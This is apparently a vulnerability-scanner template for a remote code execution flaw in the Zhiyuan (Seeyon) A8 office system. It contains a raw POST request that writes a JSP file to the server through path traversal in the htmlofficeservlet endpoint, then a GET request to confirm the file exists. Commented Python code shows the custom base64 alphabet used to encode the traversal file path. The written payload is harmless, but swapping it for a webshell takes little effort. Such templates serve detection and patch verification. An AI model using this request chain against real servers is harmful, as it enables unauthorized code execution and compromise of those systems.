id: zhiyuanOA-htmlofficeservlet-file-upload

info:
  name: Zhiyuan A8 - Remote Code Execution
  author: cnaq
  severity: critical
  description: Zhiyuan A8 is susceptible to remote code execution because of an arbitrary file write issue.
  reference:
    - https://www.cxyzjd.com/article/guangying177/110177339
    - https://github.com/sectestt/CNVD-2019-19299
    - https://cloud.tencent.com/developer/article/1817235
    - https://forum.ezreal.cool/thread-92-1-1.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: zhiyuan,cnvd,cnvd2019,rce

requests:
  - raw:
      - |
        POST /seeyon/htmlofficeservlet HTTP/1.1
        Host: {{Hostname}}

        DBSTEP V3.0     355             0               655             DBSTEP=OKMLlKlV
        OPTION=S3WYOSWLBSGr
        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
        CREATEDATE=wUghPB3szB3Xwg66
        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
        originalFileId=wV66
        originalCreateDate=wUghPB3szB3Xwg66
        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdziSGyU=GeioEwUzfeUwTwi=heidiziQJzUg3wLesy4=5nHzs
        needReadFile=yRWZdAS6
        originalCreateDate=wLeAwUSGP4e3z4CTPV66
        <%@page import="java.text.*,java.util.*,java.io.*"%><%out.println("{{randstr}}");%>
      - |
        GET /seeyon/755f85c2723bb39381c7379a604160d8.jsp HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "Date")' #会将时间戳字符串写入，响应内容“eDate=wLeAwUSGP4e3z4CTPV66 2L4b8h0KBVzuZ8FMlt1wHcwJjwq”
        condition: and

# 使用自定义符合表进行base64转换，python3代码
# import base64
# RAW = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
# CUSTOM = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
# def b64str_encode(_str1: str):
#     # 自定义字符表编码
#     transformer = _str1.maketrans(RAW, CUSTOM)
#     _strb64 = base64.b64encode(_str1.encode())
#     _str_custom = _strb64.decode().translate(transformer)
#     return _str_custom
# def b64str_decode(_str_custom: str):
#     # 自定义字符表解码
#     transformer = _str_custom.maketrans(CUSTOM, RAW)
#     _strb64 = _str_custom.translate(transformer)
#     _str1 = base64.b64decode(_strb64.encode()).decode()
#     return _str1
# str1 = r'..\..\..\ApacheJetspeed\webapps\seeyon\755f85c2723bb39381c7379a604160d8.jsp'  # md5('good')
# _str_custom = b64str_encode(str1)
# _str1 = b64str_decode(_str_custom)
# print(_str_custom, _str1)
# # qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdziSGyU=GeioEwUzfeUwTwi=heidiziQJzUg3wLesy4=5nHzs
